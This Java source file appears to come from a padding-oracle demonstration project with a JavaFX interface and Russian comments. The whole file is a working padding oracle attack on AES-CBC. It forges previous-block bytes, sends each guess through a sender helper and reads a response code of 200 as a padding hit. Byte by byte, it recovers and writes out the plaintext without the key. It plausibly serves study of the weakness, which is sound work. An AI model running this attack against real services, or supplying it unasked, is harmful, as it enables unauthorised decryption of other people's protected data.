package main.java.com.evgeniy_mh.paddingoracle;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.RandomAccessFile;
import java.util.ArrayList;
import java.util.concurrent.Callable;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.FutureTask;
import java.util.logging.Level;
import java.util.logging.Logger;
import javafx.concurrent.Task;
import javafx.scene.control.ProgressIndicator;

public class AES_CBCBruteforcer {

  final static int AES_BLOCK_SIZE = 16;
  final private ProgressIndicator progressIndicator;

  final private DecodeInfo decodeInfo;

  public AES_CBCBruteforcer(ProgressIndicator progressIndicator, DecodeInfo decodeInfo) {
    this.progressIndicator = progressIndicator;
    this.decodeInfo = decodeInfo;
  }

  /**
   * @return true- расшифровка прошла успешно; false- произошла ошибка
   */
  public Task<Boolean> Bruteforce(File in, File out) {
    return new Task<Boolean>() {
      @Override
      protected Boolean call() throws Exception {
        //Переменная для хранения результата проверки правильности дополнения
        boolean error = false;

        ArrayList<byte[]> paddings = new ArrayList<>();
        for (int i = 1; i <= AES_BLOCK_SIZE; i++) {
          byte[] pad = new byte[AES_BLOCK_SIZE];
          for (int j = AES_BLOCK_SIZE - 1; j >= AES_BLOCK_SIZE - i; j--) {
            pad[j] = (byte) i;
          }
          paddings.add(pad);
        }

        int blocksCount = (int) (in.length() / AES_BLOCK_SIZE);
        decodeInfo.blocksCount.set(blocksCount);

        ArrayList<byte[]> fileBlocks = new ArrayList<>();
        for (int i = 0; i < blocksCount; i++) {
          byte[] buff = readBytesFromFile(in, i * 16, (i * 16) + AES_BLOCK_SIZE);
          fileBlocks.add(buff);
        }

        int resultProgress = (blocksCount - 1) * AES_BLOCK_SIZE * 256;
        int progress = 0;

        FileOutputStream fos = new FileOutputStream(out, true);

        for (int i = 1; !error && i < blocksCount; i++) {
          decodeInfo.currentBlock.set(i);
          byte[] G = new byte[AES_BLOCK_SIZE];
          int G_cnt = AES_BLOCK_SIZE - 1;

          for (int b = 0; !error && b < 16; b++) { //по байтам
            decodeInfo.currentByte.set(b);
            for (int g = 0; g < 256; g++) { //по 1 байту

              byte[] Pad = paddings.get(b).clone();

              Pad[AES_BLOCK_SIZE - b - 1] = (byte) (Pad[AES_BLOCK_SIZE - b - 1] ^ g);
              if (b != 0) {
                for (int p = 0; p < AES_BLOCK_SIZE; p++) {
                  Pad[p] = (byte) (Pad[p] ^ G[p]);
                }
              }

              byte[] tempFile = new byte[AES_BLOCK_SIZE * 2];
              byte[] C2 = fileBlocks.get(i);

              System.arraycopy(Pad, 0, tempFile, 0, AES_BLOCK_SIZE);
              System.arraycopy(C2, 0, tempFile, AES_BLOCK_SIZE, AES_BLOCK_SIZE); //Pad + C2

              Callable<Integer> callable = new FileByteSender(tempFile);
              FutureTask<Integer> ftask = new FutureTask<>(callable);
              Thread thread = new Thread(ftask);
              thread.start();

              int response = 0;
              try {
                response = ftask.get();
              } catch (InterruptedException | ExecutionException ex) {
                Logger.getLogger(FXMLController.class.getName()).log(Level.SEVERE, null, ex);
              }

              if (response == 200) {
                G[G_cnt--] = (byte) g;
                progress += 255 - g;
                break;
              } else if (g == 255) {
                error = true;
              }

              progress++;
              progressIndicator.setProgress((double) progress / (double) resultProgress);
            }
          }

          byte[] C1 = fileBlocks.get(i - 1).clone();
          for (int p = 0; p < AES_BLOCK_SIZE; p++) {
            C1[p] = (byte) (C1[p] ^ G[p]);
          }
          if ((i + 1) == blocksCount) { //последний блок
            int nToDeleteBytes = C1[AES_BLOCK_SIZE - 1];
            if (nToDeleteBytes > 0 && nToDeleteBytes <= 16) { //проверка правильности дополнения
              byte[] shortC1 = new byte[AES_BLOCK_SIZE - nToDeleteBytes];
              System.arraycopy(C1, 0, shortC1, 0, shortC1.length);
              fos.write(shortC1);
            } else {
              error = true;
            }
          } else {
            fos.write(C1);
          }

        }
        fos.close();
        return !error;
      }
    };
  }

  public static byte[] readBytesFromFile(File f, int from, int to) {
    try {
      byte[] res;
      try (RandomAccessFile raf = new RandomAccessFile(f, "r")) {
        raf.seek(from);
        res = new byte[to - from];
        raf.read(res, 0, to - from);
      }
      return res;
    } catch (IOException ex) {
      Logger.getLogger(AES_CBCBruteforcer.class.getName()).log(Level.SEVERE, null, ex);
      return null;
    }
  }
}
